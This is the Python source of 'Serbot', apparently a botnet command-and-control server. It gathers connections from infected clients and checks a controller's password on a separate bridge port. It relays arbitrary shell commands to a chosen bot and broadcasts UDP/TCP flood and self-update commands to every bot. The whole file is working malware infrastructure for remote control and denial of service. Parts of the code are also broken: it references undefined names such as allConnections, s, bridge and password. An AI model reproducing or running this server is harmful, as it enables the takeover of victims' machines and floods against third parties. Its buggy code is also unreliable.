#!/usr/bin/env python
# -*- coding: utf-8 -*-

import argparse
import os
from socket import *
import sys
import threading
import time

import database

intro = """
 ____ ____ ____ ____ ____ ____ 
||S |||e |||r |||b |||o |||t ||
||__|||__|||__|||__|||__|||__||
|/__\|/__\|/__\|/__\|/__\|/__\|

Coded by: dotcppfile
Twitter: https://twitter.com/dotcppfile
Blog: http://dotcppfile.worpdress.com"
"""

class serbot():
	def __init__(self):
		self.allConnections = []
		self.allAddresses = []

	#Close all Connections
	def quitClients(self):
		for item in allConnections:
			try:
				item.send("exit")
				item.close()
			except: #Connection already closed
				pass
	
		del allConnections[:]
		del allAddresses[:]	
	
	#Get Client Connections
	def getConnections(self):
		quitClients()
	
		while 1:
			try:
				q,addr=s.accept() #Lasts 5 seconds and then Exception is raised
				q.setblocking(1) #Every new socket has no timeout; every operation takes its time.
				allConnections.append(q) #Holding our New Connections/Sockets
				allAddresses.append(addr)
			except: #Time's up
				break
	
	#Proper Sending to Controller
	def sendController(self, msg, q):
		try:
			q.send(msg)
			return 1 #success
		except: return 0 #fail
	
	def main(self):
		
		self.socket=socket(AF_INET, SOCK_STREAM)
		self.socket.settimeout(5) #5 seconds are given for every operation by socket `s`
		self.socket.bind(("0.0.0.0", args.port))
		self.socket.listen(5)
		
		self.bridge=socket(AF_INET, SOCK_STREAM)
		self.bridge.bind(("0.0.0.0", args.bridgeport))
		self.bridge.setsockopt(SOL_SOCKET,SO_REUSEADDR,1)
		
		## ###############################
		##   local mapping, quick hack; needs to be reworked
		## ###############################
		websocket = self.websocket
		allAddresses = self.allAddresses
		allConnections = self.allConnections
		sendController = serbot().sendController
		handle = serbot().handle
		
		while 1:
			self.bridge.listen(0) #There is no Queue; no one waits, 1 valid controller connection or nothing.
			q,addr=bridge.accept()
	
			cpass = q.recv(20480)
			
			if (cpass == password): loginsucc=True
			else: loginsucc=False
	
			timeout = time.time() + 500 #A Controller can't stay here forever, only 5 minutes are given. He should connect back if needed. This is added incase a Controller forgot to close the connection himself and went out on a date...
	
			breakit = False
			while 1:
				if (loginsucc == False): break #Wrong Pass; the controller gets kicked
	
				if ((time.time() > timeout) or (breakit == True)): break #5 minutes passed; the controller gets kicked
	
				try: command = q.recv(20480)
				except: break #Get back to the top if we can't recieve the command; we wait again for a new Controller (same for everything that comes next)
	
				if (command == "accept"):
					getConnections()
					if (sendController("[SERVER] Done Accepting\n", q) == 0): break #Get back to the top if we can't send to the controller; we wait again for a new controller (same for everything that comes next)
	
				elif(command == "list"):
					temporary = ""
					for item in allAddresses: temporary += "%d - %s|%s\n" % (allAddresses.index(item) + 1, str(item[0]), str(item[1]))
					if (temporary != ""):
						if (sendController(temporary, q) == 0): break
					else:
						if (sendController("[SERVER] No clients\n", q) == 0): break
	
				elif("interact " in command):
					chosenone = int(command.replace("interact ","")) - 1
					if ((chosenone < len(allAddresses)) and (chosenone >= 0 )):
						if (sendController("[SERVER] Interacting with %s\n" % str(allAddresses[chosenone]), q) == 0): break
	
						try:
							allConnections[chosenone].send("hellows123")
							vtpath = allConnections[chosenone].recv(20480) + "> "
	
							if (sendController(vtpath, q) == 0): break
	
							while 1:
								if (time.time() > timeout): #5 minutes passed, we set `breakit` to true and go back to the top
									breakit = True
									break
	
								try: data=q.recv(20480) #Recieves command
								except:
									breakit = True
									break
								
								try: #Pass it out to Client and Send back the Response
									if ("cd " in data):
										allConnections[chosenone].send(data)
										msg=allConnections[chosenone].recv(20480)
										vtpath = msg + "> "
										if (sendController(vtpath, q) == 0):
											breakit = True
											break
									elif (data == "stop"): break #We stop interacting and wait for another command
									else:
										allConnections[chosenone].send(data)
										msg=allConnections[chosenone].recv(20480)
										if (sendController(msg, q) == 0):
											breakit = True
											break
								except:
									if (sendController("[SERVER - ERROR] Client closed the connection\n[INFO] Retreiving connections again...\n", q) == 0):
										breakit = True
										break
									break
						except:
							if (sendController("[SERVER - ERROR] Client closed the connection\n[INFO] Retreiving connections again...\n", q) == 0):break
							getConnections()
					else:
						if (sendController("[SERVER - ERROR] Client doesn't exist\n", q) == 0): break
	
				elif ("udpfloodall " in command or "tcpfloodall " in command):
					for item in allConnections:
						try:
							item.send(command)
						except:
							pass
				elif (command == "selfupdateall"):
					for item in allConnections:
						try:
							item.send(command)
						except:
							pass
	
				elif(command == "quit"):
					quitClients()
					q.close()
					break
				else:
					if (sendController("[SERVER - ERROR] Invalid Command\n", q) == 0): break

if __name__=="__main__":
	Version="1.0"
	parser = argparse.ArgumentParser()
	parser.add_argument("-p", "--port", type=int, help="Client Port Number", required = True)
	parser.add_argument("-b", "--bridgeport", type=int, help="Bridge Port Number", required = True)
	parser.add_argument("-P", "--password", type=str, help="Bridge Connection Password", required = True)
	parser.add_argument("-d", "--debug", type=bool, help="Enable Debugging")
	parser.add_argument('-v', '--version',action='version', version=' [+] Version: {ver}'.format(ver=Version))
	args = parser.parse_args()
	while 1:
		try:		
			serbot().main()
		except KeyboardInterrupt:
			serbot().quitClients()
		except:
			serbot().quitClients()
	
		time.sleep(5) #Wait 5 Seconds before we start again
